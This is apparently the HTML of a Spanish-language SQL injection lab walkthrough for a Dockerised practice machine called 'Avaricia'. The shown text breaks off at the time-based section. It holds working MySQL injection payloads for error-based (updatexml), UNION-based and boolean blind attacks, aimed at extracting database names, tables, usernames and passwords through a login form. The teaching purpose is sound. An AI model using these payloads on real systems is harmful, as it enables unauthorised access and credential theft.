+@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
+</style>
+</head>
+<body class="book toc2 toc-left">
+<div id="header">
+<h1>Avaricia</h1>
+<div class="details">
+<span id="author" class="author">Manuel L. Quero</span><br>
+<span id="revdate">2025-03-31</span>
+</div>
+<div id="toc" class="toc2">
+<div id="toctitle">Table of Contents</div>
+<ul class="sectlevel1">
+<li><a href="#_ataque_sql_injection_sqli">Ataque SQL Injection (SQLi)</a>
+<ul class="sectlevel2">
+<li><a href="#_1_in_band_sql_injection">1. In-band SQL injection</a></li>
+<li><a href="#_2_blind_sql_injection">2. Blind SQL Injection</a></li>
+<li><a href="#_3_out_of_band_sql_injection_oob_sqli">3. Out-of-band SQL injection (OOB SQLi)</a></li>
+</ul>
+</li>
+<li><a href="#_solucionar_la_máquina">Solucionar la máquina</a>
+<ul class="sectlevel2">
+<li><a href="#_despliegue_de_la_máquina">Despliegue de la máquina</a></li>
+<li><a href="#_1_in_band_sql_injection_2">1. In-band SQL injection</a></li>
+<li><a href="#_2_blind_sql_injection_2">2. Blind SQL Injection</a></li>
+<li><a href="#_3_out_of_band_sql_injection_oob_sqli_2">3. Out-of-band SQL injection (OOB SQLi)</a></li>
+</ul>
+</li>
+<li><a href="#_cómo_prevenir">¿Cómo prevenir?</a>
+<ul class="sectlevel2">
+<li><a href="#_1_parametrizar">1. Parametrizar</a></li>
+<li><a href="#_2_procedimientos_almacenados">2. Procedimientos almacenados</a></li>
+<li><a href="#_3_validación_contra_valores_permitidos">3. Validación contra valores permitidos</a></li>
+<li><a href="#_4_escapar_todas_las_entradas_de_usuario">4. Escapar todas las entradas de usuario</a></li>
+<li><a href="#_5_aplicar_el_mínimo_privilegio">5. Aplicar el mínimo privilegio:</a></li>
+<li><a href="#_6_web_application_firewall_waf">6. Web Application Firewall (WAF)</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="content">
+<div id="preamble">
+<div class="sectionbody">
+<div style="page-break-after: always;"></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_ataque_sql_injection_sqli">Ataque SQL Injection (SQLi)</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Los ataques de inyección SQL se basan en la manipulación de bases de datos SQL mediante la inserción de consultas maliciosas en campos de entrada. Esto permite a un atacante alterar datos, acceder a información confidencial y realizar acciones no autorizadas. Un usuario malintencionado podría:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Suplantar la identidad de otro usuario con más privilegios.</p>
+</li>
+<li>
+<p>Elevar sus propios permisos o los de otros hasta niveles administrativos.</p>
+</li>
+<li>
+<p>Manipular datos existentes o eliminarlos.</p>
+</li>
+<li>
+<p>Obtener acceso a información sensible almacenada en la base de datos.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Existen tres grandes grupos de ataques SQLi:</p>
+</div>
+<div class="sect2">
+<h3 id="_1_in_band_sql_injection">1. In-band SQL injection</h3>
+<div class="paragraph">
+<p>Este es el tipo de ataque SQLi más clásico y directo. Se caracteriza porque el atacante envía consultas SQL maliciosas y recibe los resultados por el mismo canal de comunicación, generalmente como una respuesta de la base de datos en una página web.</p>
+</div>
+<div class="paragraph">
+<p>Dentro de este grupo encontramos dos subtipos:</p>
+</div>
+<div class="sect3">
+<h4 id="_a_error_based_sql_injection">a. Error-based SQL injection</h4>
+<div class="paragraph">
+<p>Este ataque explota los mensajes de error devueltos por la base de datos para obtener información sensible. Aunque estos errores pueden parecer inofensivos, un atacante puede utilizarlos para:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Obtener la versión de la base de datos y poder usar ataques específicos dependiendo de la versión.</p>
+</li>
+<li>
+<p>Conocer la estructura de la base de datos para poder intentar SQLi más específicas.</p>
+</li>
+<li>
+<p>Extraer datos de la base de datos. El proceso es más largo y complejo pero se pueden manipular los errores para extraer datos.</p>
+</li>
+</ul>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_union_based_sql_injection">b. Union-based SQL injection</h4>
+<div class="paragraph">
+<p>Este ataque utiliza la cláusula <strong>UNION</strong> para combinar en una misma consulta información legítima con datos sensibles. Es un método especialmente peligroso, ya que permite al atacante recuperar casi cualquier dato almacenado en la base de datos con una única consulta.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_2_blind_sql_injection">2. Blind SQL Injection</h3>
+<div class="paragraph">
+<p>Las inyecciones SQL a ciegas son una variante en la que el atacante no recibe respuestas directas de la base de datos. En lugar de obtener mensajes de error o resultados visibles, debe inferir la información mediante observación indirecta.</p>
+</div>
+<div class="paragraph">
+<p>Este tipo de ataques funciona como un sistema de "verdadero o falso", donde el atacante prueba diferentes consultas y analiza los cambios en el comportamiento del sistema.</p>
+</div>
+<div class="paragraph">
+<p>Si quieres saber más sobre este tipo de ataques puedes mirar &#8594; <a href="https://www.exploit-db.com/docs/47367">Inyección SQL a ciegas</a></p>
+</div>
+<div class="paragraph">
+<p>Dentro de este grupo encontramos dos subtipos:</p>
+</div>
+<div class="sect3">
+<h4 id="_a_boolean_based_sql_injection">a. Boolean-Based SQL Injection</h4>
+<div class="paragraph">
+<p>En este ataque, el atacante inyecta una condición que evalúa si es <strong>TRUE</strong> o <strong>FALSE</strong>, observando las diferencias en la respuesta del servidor. Normalmente, se utiliza la cláusula <strong>AND</strong> para construir estas pruebas.</p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_time_based_sql_injection">b. Time-based SQL Injection</h4>
+<div class="paragraph">
+<p>En este caso, el ataque se basa en utilizar funciones como <strong>SLEEP()</strong> o <strong>BENCHMARK()</strong> para medir los tiempos de respuesta y determinar si una consulta se ejecutó correctamente.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_3_out_of_band_sql_injection_oob_sqli">3. Out-of-band SQL injection (OOB SQLi)</h3>
+<div class="paragraph">
+<p>El ataque de SQL fuera de banda consiste en enviar la información consultada a través de un canal diferente al utilizado para la interacción con la aplicación. El atacante usa comandos SQL para que envíen información a través de una conexión de red directa, una solicitud DNS o una solicitud HTTP</p>
+</div>
+<div style="page-break-after: always;"></div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_solucionar_la_máquina">Solucionar la máquina</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Vamos a ver cómo realizar los diversos tipos de ataques de inyección SQL que hemos visto anteriormente y ver las respuestas que nos dan, además de entender las consultas que realizamos.</p>
+</div>
+<div class="paragraph">
+<p>Sería conveniente utilizar una distribución Linux, es recomendable usar Kali Linux.</p>
+</div>
+<div class="sect2">
+<h3 id="_despliegue_de_la_máquina">Despliegue de la máquina</h3>
+<div class="paragraph">
+<p>Como requisito, necesitaremos tener instalado docker y docker-compose.</p>
+</div>
+<div class="paragraph">
+<p>Podemos ver como instalar docker para varias distribuciones de linux &#8594; <a href="https://docs.docker.com/engine/install/">Instalar Docker</a></p>
+</div>
+<div class="paragraph">
+<p>Podemos ver como instalar docker-compose para varias distribuciones de linux &#8594; <a href="https://docs.docker.com/compose/install/linux/">Instalar Docker-Compose</a></p>
+</div>
+<div class="paragraph">
+<p>Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como una pirámide en la página. Después en un directorio deberemos tener el auto_deploy.sh, avaricia.tar y docker-compose.yml, deberemos acceder con la terminal a dicho directorio y ejecutar el siguiente comando.</p>
+</div>
+<div class="paragraph">
+<p>(Si el auto_deploy no tiene permisos se los damos mediante <strong>chmod +x</strong>).</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo bash auto_deploy.sh avaricia.tar</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>En nuestro caso la base de datos usa Mysql, podemos ver una guía de los distintos payloads para otros servicios de bases de datos &#8594; <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLiCheatSheet</a>.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_1_in_band_sql_injection_2">1. In-band SQL injection</h3>
+<div class="sect3">
+<h4 id="_a_error_based_sql_injection_2">a. Error-based SQL injection</h4>
+<div class="paragraph">
+<p>Con este ataque, podremos obtener mucha información sobre la base de datos, desde su versión hasta contraseñas.</p>
+</div>
+<div class="sect4">
+<h5 id="_reconocimiento">Reconocimiento</h5>
+<div class="paragraph">
+<p>Pero antes de esto deberemos comprobar si nos muestra los errores o no para ello deberemos hacer la siguiente consulta:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: '
+Contraseña: 1234</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Al poner esa comilla simple, se cierra la consulta que hace la web al servidor de mysql, por lo que el resto sería un error en la sintaxis de sql.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads">Payloads</h5>
+<div class="paragraph">
+<p>Para cada uno de ellos utilizaremos la clausula updatexml(), que permite modificar datos XML dentro de bases de datos MySQL. En nuestro caso lo usaremos para lanzar los errores y mostrar su contenido como un mensaje.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>UPDATEXML(xml_target, xpath_expr, new_value)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener la versión del motor de MySQL</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, @@version), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>'</strong> &#8594; Esto es un carácter de comilla simple que cierra la consulta original y nos permite iniciar la nuestra.</p>
+</li>
+<li>
+<p><strong>AND</strong> &#8594; Añadimos una condición a la consulta original.</p>
+</li>
+<li>
+<p><strong>updatexml()</strong> &#8594; La función intenta procesar una expresión XML, pero si se le pasa un valor que no es válido como XML (en este caso, un valor concatenado con concat), lanzará un error. El contenido que se pase dentro de concat() se convierte en el mensaje de error, lo que permite al atacante obtener información sensible.</p>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>null</strong> &#8594; Sirve para no afectar al ataque.</p>
+</li>
+<li>
+<p><strong>concat(0x3a, @@version)</strong> &#8594; Con esto, concatenaremos varias cadenas, el valor de <em>0x3a</em> en hexadecimal corresponde con el carácter :, que se usará como separador entre los valores concatenados. Y <em>@@version</em> es una variable global en MySQL que devuelve la versión del servidor.</p>
+</li>
+<li>
+<p><strong>null</strong> &#8594; Sirve para no afectar al ataque.</p>
+</li>
+<li>
+<p><strong>--</strong> &#8594; Sirven para que el resto de consulta sea comentado y sea ignorado.</p>
+</li>
+<li>
+<p><strong>'</strong> &#8594; Este carácter es para cerrar la otra comilla simple y que no nos de ningún error, y así se pueda comentar el resto de la consulta correctamente.</p>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Version1.png" alt="Version1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Version2.png" alt="Version2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la base de datos actual</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, database()), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Como podemos ver la sintaxis es la misma que el anterior pero cambia el contenido del concat().</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>database()</strong> &#8594; Esta es una función de MySQL que devuelve el nombre de la base de datos actual a la que está conectado el servidor MySQL.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la primera tabla</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>information_schema.tables</strong> &#8594; <em>information_schema</em> es una base de datos especial en MySQL que contiene información sobre todas las bases de datos y sus tablas. La tabla tables contiene los nombres de todas las tablas de una base de datos.</p>
+</li>
+<li>
+<p><strong>table_schema=database()</strong> &#8594; database() devuelve el nombre de la base de datos actual. Al usar esta función dentro de la consulta, estás buscando las tablas dentro de la base de datos actual.</p>
+</li>
+<li>
+<p><strong>LIMIT 0,1</strong> &#8594; Esto limita los resultados de la consulta a una sola fila. De esta forma obtendremos solo el primer nombre de tabla de la base de datos.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Usuarios1.png" alt="TablaUsuarios1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Usuarios2.png" alt="TablaUsuarios2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la primera columna de una tabla</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>information_schema.columns</strong> &#8594; Esta tabla contiene información sobre las columnas de todas las tablas de la base de datos. Se puede consultar para obtener detalles sobre las columnas de una tabla específica.</p>
+</li>
+<li>
+<p><strong>table_name='usuarios'</strong> &#8594; Aquí estamos buscando las columnas de la tabla llamada usuarios (que lo podemos obtener de la anterior consulta).</p>
+</li>
+<li>
+<p><strong>LIMIT 0,1</strong> &#8594; Limitamos el resultado a solo una columna para facilitar la consulta y evitar que se devuelvan demasiados resultados.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Colum1.png" alt="Columna1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Colum2.png" alt="Columna2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Extraer usuarios y contraseñas (u otras columnas)</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT usuario FROM usuarios LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Como ya sabemos la tabla y podemos conocer las distintas columnas que tiene, se hace más sencilla la busqueda de información. En este caso, vamos a extraer el nombre del primer usuario.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Nombre1.png" alt="NombreUsuarios1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Nombre2.png" alt="NombreUsuarios2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT password FROM usuarios LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>También podemos ver las contraseñas si sabes la columna en la que están. Si queremos ver otros datos de la misma columna podemos cambiar el LIMIT a LIMIT(1,1).</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Contraseñas1.png" alt="Contraseñas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/error-based/Contraseñas2.png" alt="Contraseñas2">
+</div>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_union_based_sql_injection_2">b. Union-based SQL injection</h4>
+<div class="sect4">
+<h5 id="_reconocimiento_2">Reconocimiento</h5>
+<div class="paragraph">
+<p>Para este tipo de ataques es importante conocer cuantas columnas tiene la consulta original, para que las columnas que inyecta el UNION coincidan.</p>
+</div>
+<div class="paragraph">
+<p>Entonces, podemos usar el payload anterior para obtener el nombre la columna empezando por LIMIT(0,1) hasta que nos de error.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>' AND updatexml(null, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' LIMIT 0,1)), null) -- '</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>O podemos usar un payload UNION para ir sacando mediante NULL la cantidad de columnas que tiene.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL, NULL,(...) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Aclarar que los (&#8230;&#8203;) son NULL en caso que la tabla tenga más columnas. Si la tabla tiene seis columnas se deberán añadir dos NULL más al payload.</p>
+</div>
+<div class="paragraph">
+<p>De esta forma, sabremos la estructura de la tabla y podremos incluso acceder, aunque no tengamos datos de nadie todavía. Esto nos permitirá inyectar datos específicos.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads_2">Payloads</h5>
+<div class="paragraph">
+<p><strong>Recuperar el nombre de la base de datos</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), database() -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Este payload lo que nos mostrará será el nombre de la base de datos en la posición que pongamos database(), es decir, si la tabla tiene seis columnas y en la cuenta se muestran los datos de las tres últimas columnas, tendremos que poner database() en alguna de esas posiciones para obtener los datos, en este caso el nombre de la base de datos.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Recuperar el nombre de las tablas</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(table_name)</strong> &#8594; Esta función de MySQL concatena todos los nombres de las tablas en la base de datos, obteniendolas separadas por comas.</p>
+</li>
+<li>
+<p><strong>information_schema.tables</strong> &#8594; Esta tabla contiene información sobre todas las tablas en todas las bases de datos en MySQL. La consulta se limita a la base de datos actual utilizando WHERE <strong>table_schema=database()</strong>.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Tablas1.png" alt="NombreTablas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Tablas2.png" alt="NombreTablas2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Recuperar los nombres de las columnas de una tabla específica</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(column_name) FROM information_schema.columns WHERE table_name='usuarios' -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(column_name)</strong> &#8594; Similar al paso anterior, esta función concatenará los nombres de las columnas de la tabla usuarios y los devolverá como un solo resultado.</p>
+</li>
+<li>
+<p><strong>information_schema.columns</strong> &#8594; Esta tabla contiene información sobre todas las columnas de todas las tablas en MySQL. Al limitarla por table_name='usuarios', obtenemos los nombres de las columnas de la tabla usuarios.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Extraer datos de las columnas (usuarios, contraseñas u otras columnas)</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(usuario) FROM usuarios -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(usuario)</strong> &#8594; Aquí estamos extrayendo los datos de la columna usuario de la tabla usuarios y concatenándolos para que todos los nombres de usuario sean devueltos en una sola cadena separada por comas.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Usuarios1.png" alt="Usuarios1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Usuarios2.png" alt="Usuarios2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(password) FROM usuarios -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(password)</strong> &#8594; Similar al paso anterior, pero en este caso estamos extrayendo los valores de la columna password de la tabla usuarios.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Contraseñas1.png" alt="Contraseñas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/in-band/union-based/Contraseñas2.png" alt="Contraseñas2">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_2_blind_sql_injection_2">2. Blind SQL Injection</h3>
+<div class="sect3">
+<h4 id="_a_boolean_based_sql_injection_2">a. Boolean-Based SQL Injection</h4>
+<div class="paragraph">
+<p>En los ataques boolean-based se usan operadores lógicos como AND u OR para alterar las condiciones de una consulta SQL. AND se usa cuando se conoce una condición válida (como un usuario) y se quiere comprobar si otra también lo es, por ejemplo 1=1. OR, en cambio, permite que la consulta sea verdadera si al menos una condición se cumple, como usuario = 'admin' OR 1=1, forzando así una respuesta positiva.</p>
+</div>
+<div class="paragraph">
+<p>En nuestro caso, vamos a usar AND ya que con los anteriores resultado sabemos que existe el usuario <strong>admin</strong> y <strong>user</strong>. En caso de que no conozcamos estos datos se recomienda usar OR.</p>
+</div>
+<div class="sect4">
+<h5 id="_reconocimiento_3">Reconocimiento</h5>
+<div class="paragraph">
+<p>Ahora valuaremos si la página es vulnerable a este tipo de ataques, la lógica de esta página es que si es verdad nos dejará acceder, si es falso nos dirá que las credenciales son incorrectas. A este tipo de ataques se les suele hacer un script para automatizar la iteración y obtener respuestas para cosas más específicas.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND 1=1 --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND 1=2 --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Recon3.png" alt="Reconocimiento3">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Recon4.png" alt="Reconocimiento4">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads_3">Payloads</h5>
+<div class="paragraph">
+<p><strong>Inferir nombre de la base de datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En esta parte, cómo queremos algo muy específico que es el nombre de la base de datos, podemos ir letra por letra para ir sacando el nombre de la base de datos o tener un script y usar un diccionario para sacarlo más rápido. En este caso buscamos <strong>banco</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND SUBSTRING(database(),1,1) = 'a' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Y así deberemos seguir con cada letra, obviamente esto no está pensado para hacerlo así y hay scripts que solucionan estos problemas. Una herramienta muy eficaz es <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>.</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SUBSTRING(database(),1,1)</strong> &#8594; Toma el primer carácter del nombre de la base de datos. Para pasar al siguiente caracter sería SUBSTRING(database(),2,1), etc.</p>
+</li>
+<li>
+<p><strong>= 'b'</strong> &#8594; Compara si ese carácter es 'b'.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND SUBSTRING(database(),1,1) = 'b' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos3.png" alt="BaseDatos3">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos4.png" alt="BaseDatos4">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Inferir nombre de tablas</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>usuarios</strong> en la base de datos actual.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'a' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas1.png" alt="Tablas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas2.png" alt="Tablas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas3.png" alt="Tablas3">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas4.png" alt="Tablas4">
+</div>
+</div>
+<div class="paragraph">
+<p>Este payload consulta la primera tabla del esquema actual y verifica si empieza con la letra 'u'. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(&#8230;&#8203;,2,1), etc.) para inferir cada tabla y cada letra.</p>
+</div>
+<div class="paragraph">
+<p><strong>Extraer columnas de una tabla</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>usuario</strong> en la tabla <strong>usuarios</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="paragraph">
+<p>Y al igual que el resto se debe de ir carácter por carácter para obtener la pálabra correcta. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(&#8230;&#8203;,2,1), etc.) para inferir cada tabla y cada letra.</p>
+</div>
+<div class="paragraph">
+<p><strong>Extraer datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>admin123</strong> en la columna <strong>password</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(usuario,1,1) FROM usuarios LIMIT 1,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña1.png" alt="Contraseña1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña2.png" alt="Contraseña2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(usuario,2,1) FROM usuarios LIMIT 1,1) = 's' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña3.png" alt="Contraseña3">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña4.png" alt="Contraseña4">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_aclaración">Aclaración</h5>
+<div class="paragraph">
+<p>Como hemos visto, este ataque es muy repetitivo, por lo que he recalcado que es mucho más eficaz realizarlo mediante un script. Además, en un caso real no conoceremos de antemano ninguna información, por eso he explicado en cada paso qué es lo que busco, para ir directo al objetivo y no perder tiempo con pruebas innecesarias.</p>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_time_based_sql_injection_2">b. Time-based SQL Injection</h4>
+<div class="paragraph">
+<p>Este tipo de ataque es muy parecido al anterior, por lo que también recomendaría usar un script</p>
+</div>
